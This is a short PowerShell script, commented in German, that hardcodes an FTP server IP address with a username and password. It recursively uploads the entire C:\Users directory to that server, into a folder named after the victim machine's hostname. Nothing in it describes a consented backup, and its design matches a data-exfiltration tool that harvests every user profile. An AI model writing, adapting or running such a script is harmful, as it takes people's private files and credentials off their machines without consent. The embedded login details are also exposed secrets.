# Konfiguration
$ftpServer = "195.201.42.106"
$ftpUsername = "ftpuser"
$ftpPassword = "yxc_2023"
$localFolder = "C:\Users"
$remoteFolder = $env:COMPUTERNAME

# Funktion zum rekursiven Hochladen von Dateien und Ordnern
function RecursiveUpload($path, $ftpPath) {
    # Liste alle Dateien und Unterverzeichnisse im angegebenen Pfad auf
    $files = Get-ChildItem -Path $path

    # Schleife über alle Dateien und Unterverzeichnisse
    foreach ($file in $files) {
        # Erstelle den Remote-Pfad basierend auf dem FTP-Pfad
        $relativePath = $file.FullName.Substring($path.Length + 1)
        $remotePath = "$ftpPath/$relativePath"

        # Überprüfe, ob es sich um ein Verzeichnis handelt
        if ($file.PSIsContainer) {
            # Erstelle das Verzeichnis auf dem FTP-Server
            $ftpRequest = [System.Net.FtpWebRequest]::Create($remotePath)
            $ftpRequest.Method = [System.Net.WebRequestMethods+Ftp]::MakeDirectory
            $ftpRequest.Credentials = New-Object System.Net.NetworkCredential($ftpUsername, $ftpPassword)
            $ftpResponse = $ftpRequest.GetResponse()

            # Rufe die Funktion rekursiv für das Unterverzeichnis auf
            RecursiveUpload $file.FullName $remotePath
        } else {
            # Lade die Datei auf den FTP-Server hoch
            $ftpRequest = [System.Net.FtpWebRequest]::Create($remotePath)
            $ftpRequest.Method = [System.Net.WebRequestMethods+Ftp]::UploadFile
            $ftpRequest.Credentials = New-Object System.Net.NetworkCredential($ftpUsername, $ftpPassword)
            $ftpStream = $ftpRequest.GetRequestStream()
            $fileStream = [System.IO.File]::OpenRead($file.FullName)
            $fileStream.CopyTo($ftpStream)
            $fileStream.Close()
            $ftpStream.Close()
        }
    }
}

# Erstelle eine WebRequest-Instanz für die FTP-Verbindung
$ftpRequest = [System.Net.FtpWebRequest]::Create("ftp://$ftpServer/$remoteFolder")
$ftpRequest.Method = [System.Net.WebRequestMethods+Ftp]::MakeDirectory
$ftpRequest.Credentials = New-Object System.Net.NetworkCredential($ftpUsername, $ftpPassword)
$ftpResponse = $ftpRequest.GetResponse()

# Rufe die Funktion für den Hauptordner auf, um den Uploadvorgang zu starten
RecursiveUpload $localFolder "ftp://$ftpServer/$remoteFolder"
